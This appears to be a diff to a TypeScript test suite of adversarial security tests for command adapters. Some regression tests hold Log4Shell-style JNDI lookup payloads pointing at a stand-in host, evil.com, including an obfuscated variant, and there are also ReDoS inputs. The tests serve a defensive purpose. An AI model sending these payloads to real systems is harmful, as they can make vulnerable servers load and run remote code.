@@ -23,7 +23,6 @@ import { handleArchiveCommand } from './archive';
 import { handleBenchmarkCommand } from './benchmark';
 import { handleDoctorCommand } from './doctor';
 import { handleEvidenceCommand } from './evidence';
-import { handlePreflightCommand } from './preflight';
 import { handleResetCommand } from './reset';
 import { handleRetrieveCommand } from './retrieve';
 import { handleSyncPlanCommand } from './sync-plan';
@@ -495,7 +494,7 @@ describe('Command Adapters - Adversarial Security Tests', () => {
 
 		describe('Extremely long arguments', () => {
 			const longString = 'A'.repeat(10000);
-			const veryLongString = 'B'.repeat(100000);
+			const _veryLongString = 'B'.repeat(100000);
 
 			it('handleRetrieveCommand should handle long IDs without crash', async () => {
 				const result = await handleRetrieveCommand(tempDir, [longString]);
@@ -913,8 +912,28 @@ describe('Command Adapters - Adversarial Security Tests', () => {
 	describe('Known Attack Pattern Regression Tests', () => {
 		it('should not be vulnerable to CVE-2021-44228 style attacks', async () => {
 			const jndiPayloads = [
-				'${jndi:ldap://evil.com/a}',
-				'${${lower:j}${lower:n}${lower:d}${lower:i}:${lower:l}${lower:d}${lower:a}${lower:p}://evil.com/a}',
+				'$' + '{jndi:ldap://evil.com/a}',
+				'$' +
+					'{' +
+					'$' +
+					'{lower:j}' +
+					'$' +
+					'{lower:n}' +
+					'$' +
+					'{lower:d}' +
+					'$' +
+					'{lower:i}' +
+					':' +
+					'$' +
+					'{lower:l}' +
+					'$' +
+					'{lower:d}' +
+					'$' +
+					'{lower:a}' +
+					'$' +
+					'{lower:p}' +
+					'://evil.com/a' +
+					'}',
 			];
 
 			for (const payload of jndiPayloads) {
@@ -934,8 +953,8 @@ describe('Command Adapters - Adversarial Security Tests', () => {
 		it('should handle ReDoS attempt patterns', async () => {
 			// Patterns that could cause catastrophic backtracking
 			const redosPayloads = [
-				'a'.repeat(100) + '!',
-				'('.repeat(50) + 'a' + ')'.repeat(50),
+				`${'a'.repeat(100)}!`,
+				`${'('.repeat(50)}a${')'.repeat(50)}`,
 			];
 
 			for (const payload of redosPayloads) {
